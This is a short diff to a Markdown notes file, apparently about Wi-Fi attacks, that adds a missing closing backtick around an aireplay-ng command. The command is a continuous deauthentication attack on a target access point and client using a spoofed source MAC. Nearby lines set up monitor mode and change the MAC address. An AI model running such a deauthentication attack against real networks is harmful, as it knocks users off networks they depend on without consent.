@@ -80,7 +80,7 @@ ifconfig mon0 up
 macchanger -s mon0
 ```
 #### Aireplay-ng  
-`aireplay-ng -0 0 -e XJ-900 -a <target bssid> -c <target host mac addr> -h <source of attack> <interface>  
+`aireplay-ng -0 0 -e XJ-900 -a <target bssid> -c <target host mac addr> -h <source of attack> <interface>`  
 
 #### Turn wifi card back into manager mode to connect to Internet.   
 
